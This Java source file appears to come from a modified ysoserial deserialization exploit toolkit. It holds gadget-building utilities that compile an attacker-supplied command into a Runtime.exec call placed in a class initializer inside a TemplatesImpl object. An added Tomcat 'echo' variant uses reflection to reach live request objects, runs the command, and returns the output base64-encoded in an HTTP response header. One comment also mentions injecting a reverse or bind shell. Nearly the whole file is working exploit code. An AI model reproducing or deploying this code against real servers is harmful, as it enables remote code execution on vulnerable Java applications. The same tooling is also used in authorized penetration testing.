package ysoserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import com.nqzero.permit.Permit;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.CtNewMethod;
import org.apache.coyote.RequestInfo;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
    "restriction", "rawtypes", "unchecked"
})
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(final String command, String status) throws Exception {
        if (status.equals("TomcatEcho")) {
            return createTemplatesImplByTomcatEcho(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        } else if (status.equals("SpringEcho")) {
            // ... 增加 SpringEcho 的代码逻辑
        }
        System.out.println("没有你所说的 Echo, 我要执行默认的逻辑...");
        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static Object createTemplatesImpl(final String command) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replace("\\", "\\\\").replace("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static <T> T createTemplatesImplByTomcatEcho(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        pool.insertClassPath(new ClassClassPath(RequestInfo.class));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // 增加 getFV 方法
        clazz.addMethod(CtNewMethod.make("    public static Object getFV(Object targetObject, String fieldName) throws Exception {\n" +
            "        java.lang.reflect.Field field = null;\n" +
            "        Class clazz = targetObject.getClass();\n" +
            "        while (clazz != Object.class) {\n" +
            "            try {\n" +
            "                field = clazz.getDeclaredField(fieldName);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException e) {\n" +
            "                clazz = clazz.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "        if (field == null) {\n" +
            "            throw new NoSuchFieldException(\"Field '\" + fieldName + \"' not found in class hierarchy of \" + targetObject.getClass().getName());\n" +
            "        } else {\n" +
            "            field.setAccessible(true);\n" +
            "            return field.get(targetObject);\n" +
            "        }\n" +
            "    }", clazz));
        String cmd = "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            boolean flag = true;\n" +
            "            for (int i = 0; i < threads.length; i++) {\n" +
            "                Thread thread = threads[i];\n" +
            "                String name = thread.getName();\n" +
            "                if (!name.contains(\"exec\") && name.contains(\"http\")) {\n" +
            "                    java.util.List lsts = (java.util.List) getFV(getFV(getFV(getFV(getFV(thread, \"target\"), \"this$0\"), \"handler\"), \"global\"), \"processors\");\n" +
            "                    for (int j = 0; j < lsts.size(); j++) {\n" +
            "                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) lsts.get(j);\n" +
            "                        java.lang.reflect.Field myReq = requestInfo.getClass().getDeclaredField(\"req\");\n" +
            "                        myReq.setAccessible(true);\n" +
            "                        org.apache.coyote.Request request = (org.apache.coyote.Request) myReq.get(requestInfo);\n" +
            "                        if (flag && request.decodedURI().toString() != null) {\n" +
            "                            org.apache.coyote.Response res = request.getResponse();\n" +
            "                            String msg = new sun.misc.BASE64Encoder().encode(new java.util.Scanner(Runtime.getRuntime().exec(\"" + command.replace("\\", "\\\\").replace("\"", "\\\"") + "\").getInputStream()).useDelimiter(new String(new byte[]{0})).next().getBytes(\"UTF-8\")).replace(\"\\r\\n\", \"\");\n" +
            "                            res.setStatus(200);\n" +
            "                            res.addHeader(\"result\", msg);\n" +
            "                            flag = false;\n" +
            "                        }\n" +
            "// 由于 ByteChunk 在 Tomcat 8.5.0 中上下文, 会遇到 Http11OutputBuffer::doWrite 方法空指针异常问题, 所以在这里不使用这种方式进行回显了\n" +
            "//                        org.apache.tomcat.util.buf.ByteChunk byteChunk = new org.apache.tomcat.util.buf.ByteChunk();\n" +
            "//                        byteChunk.setBytes(msg.getBytes(), 0, msg.length());\n" +
            "//                        res.doWrite(byteChunk);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
//        clazz.defrost();
//        clazz.writeFile("./");
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
        IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
